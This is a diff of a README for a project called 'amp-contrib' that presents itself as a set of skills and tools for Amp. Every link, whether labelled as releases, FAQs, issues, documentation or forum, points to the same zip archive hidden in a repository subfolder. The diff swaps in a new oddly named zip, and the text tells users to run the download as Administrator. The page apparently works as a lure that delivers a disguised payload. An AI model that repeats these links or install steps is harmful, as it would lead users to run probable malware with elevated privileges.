@@ -1,6 +1,6 @@
 # 🚀 amp-contrib - Essential Skills and Tools for Amp
 
-[![Download amp-contrib](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip)](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip)
+[![Download amp-contrib](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip)](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to amp-contrib! This application provides a collection of curated skills
 
 To get started with amp-contrib, you need to download the application. Follow these simple steps:
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip).
+1. Visit our [Releases page](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip).
 2. You will see a list of available versions. Look for the latest release, which features the most recent updates and fixes.
 3. Click on the asset you want to download. Each version contains files you can use directly.
 4. After the download is complete, locate the file on your computer, usually found in your Downloads folder.
@@ -53,19 +53,19 @@ If you run into any issues while downloading or using amp-contrib, here are some
 2. **Installation Problems:** If the application fails to install, check your system requirements. Ensure your OS version is compatible.
 3. **Running the Application:** If double-clicking the file does not open the application, right-click on it and select "Run as Administrator."
 
-If you still have problems, please check our [FAQs](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip) for additional assistance.
+If you still have problems, please check our [FAQs](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip) for additional assistance.
 
 ## 📞 Support
 
-For more personalized help, open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip). Our community and contributors will help you resolve any concerns you have.
+For more personalized help, open an issue on our [GitHub Issues page](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip). Our community and contributors will help you resolve any concerns you have.
 
 ## 📄 Contributing
 
-We welcome contributions from everyone. If you want to add new skills, tools, or commands to amp-contrib, please review our [Contribution Guidelines](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip) on GitHub. 
+We welcome contributions from everyone. If you want to add new skills, tools, or commands to amp-contrib, please review our [Contribution Guidelines](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip) on GitHub. 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip) - Dive deeper into amp-contrib features and best practices.
-- [Community Forum](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip) - Join discussions and share your experiences with other users.
+- [Documentation](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip) - Dive deeper into amp-contrib features and best practices.
+- [Community Forum](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip) - Join discussions and share your experiences with other users.
 
-Thank you for choosing amp-contrib. We aim to make your Amp experience as smooth and productive as possible! For further downloads, remember to revisit the [Releases page](https://raw.githubusercontent.com/GGplayerp/amp-contrib/main/.agents/skills/ast-grep/amp-contrib-1.1-alpha.5.zip).
+Thank you for choosing amp-contrib. We aim to make your Amp experience as smooth and productive as possible! For further downloads, remember to revisit the [Releases page](https://github.com/GGplayerp/amp-contrib/raw/refs/heads/main/.agents/skills/tmux/contrib_amp_Auscultoscope.zip).
